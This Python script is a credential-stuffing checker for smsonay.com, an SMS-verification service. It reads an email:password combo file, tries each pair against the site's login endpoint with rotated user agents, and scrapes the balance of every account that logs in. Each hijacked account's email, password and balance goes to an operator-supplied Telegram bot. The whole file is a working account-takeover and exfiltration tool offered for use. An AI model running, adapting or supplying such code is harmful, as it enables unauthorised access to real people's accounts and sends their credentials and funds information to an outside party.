import http.client
import urllib.parse
import random
import os
import pyfiglet
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Define colors
GREY = Fore.LIGHTBLACK_EX
RED = Fore.RED
GREEN = Fore.GREEN
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

def print_banner(title):
    os.system('clear')
    print(GREY)
    print(pyfiglet.figlet_format(title, font='smslant') + f"{GREEN}                       Github: SPARUX-666 </>\n")
    print(f"{GREEN}{'━'*67}{RESET}")

def read_credentials_from_file(file_name):
    credentials = []
    try:
        with open(file_name, "r", encoding="utf-8") as file:
            lines = file.readlines()
            for line in lines:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    credentials.append(parts)
                else:
                    print(RED + f"❌ Invalid Format: {line.strip()} - Expected format email:password")
    except FileNotFoundError:
        print(RED + "❌ File not found!")
    except Exception as error:
        print(RED + f"❌ File reading error: {error}")
    return credentials

def login(email, password, user_agent):
    try:
        login_url = "www.smsonay.com"
        path = "/ajax/login"
        headers = {
            "User-Agent": user_agent,
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = urllib.parse.urlencode({"email": email, "password": password})

        connection = http.client.HTTPSConnection(login_url)
        connection.request("POST", path, body=data, headers=headers)
        response = connection.getresponse()
        data = response.read()
        cookies = response.getheader("Set-Cookie")
        connection.close()
        return response.status, data, cookies
    except Exception as error:
        print(RED + f"❌ Request error: {error}")
        return None, None, None

def get_balance(cookies, user_agent):
    try:
        panel_url = "www.smsonay.com"
        path = "/panel"
        headers = {
            "User-Agent": user_agent,
            "Cookie": cookies
        }

        connection = http.client.HTTPSConnection(panel_url)
        connection.request("GET", path, headers=headers)
        response = connection.getresponse()
        data = response.read()
        connection.close()
        if response.status == 200:
            return parse_balance(data.decode())
        else:
            print(RED + "❌ Cannot access the panel page!")
            return None
    except Exception as error:
        print(RED + f"❌ Request error: {error}")
        return None

def parse_balance(html):
    try:
        start_tag = '<a href="https://www.smsonay.com/panel/balance" class="btn btn-success me-2">'
        end_tag = '</a>'
        start_index = html.find(start_tag)
        if start_index == -1:
            return None
        start_index += len(start_tag)
        end_index = html.find(end_tag, start_index)
        if end_index == -1:
            return None
        balance_str = html[start_index:end_index].strip()
        return balance_str
    except Exception as error:
        print(RED + f"❌ Parsing error: {error}")
        return None

def send_telegram_message(bot_token, chat_id, message):
    try:
        api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        params = urllib.parse.urlencode({"chat_id": chat_id, "text": message})
        connection = http.client.HTTPSConnection("api.telegram.org")
        connection.request("GET", f"/bot{bot_token}/sendMessage?{params}")
        response = connection.getresponse()
        response_text = response.read().decode()
        connection.close()
        if response.status != 200:
            print(RED + f"❌ Failed to send to bot: {response_text}")
    except Exception as error:
        print(RED + f"❌ Failed to send to bot: {error}")

def scan_accounts(file_name, bot_token, chat_id, success_message):
    credentials = read_credentials_from_file(file_name)
    if not credentials:
        print(RED + "❌ No valid credentials found!")
        return

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    ]

    failed_conditions = [
        "Giriş Başarısız!\",\"message\":\"Lütfen email ve parolayı kontrol edip tekrar deneyin.",
        "{\"success\":false,\"",
        "Lütfen email ve parolayı kontrol edip tekrar deneyin."
    ]
    success_conditions = [
        "Giriş Başarılı!",
        "Başarıyla giriş yaptınız."
    ]

    for email, password in credentials:
        user_agent = random.choice(user_agents)
        status, response_data, cookies = login(email, password, user_agent)
        if status is None:
            continue

        response_text = response_data.decode()
        if any(condition in response_text for condition in failed_conditions):
            print(f"❌{RED} {email} : {password} | Invalid account!")
        elif any(condition in response_text for condition in success_conditions):
            print(f"✅{GREEN} Login successful: {email} : {password}")
            balance = get_balance(cookies, user_agent)
            if balance is not None:
                send_telegram_message(bot_token, chat_id, success_message.format(email=email, password=password, balance=balance))
            else:
                print(RED + "❌ Could not retrieve balance.")
        else:
            print(f"❌ {RED} {email} : An unknown error occurred.")

def main():
    print_banner('SmsOnayLogin+')
    bot_token = input(f"{BLUE}Enter Bot Token: {GREY}")
    chat_id = input(f"{BLUE}Enter Telegram ID: {GREY}")
    success_message = "smsonay.com\nHit Account\nEmail: {email}\nPassword: {password}\nBalance: {balance}\nGithub: Github.com/Sparux-666"

    file_name = input(f"{BLUE}Enter Combo File Path: {GREY}")
    scan_accounts(file_name, bot_token, chat_id, success_message)

if __name__ == "__main__":
    main()
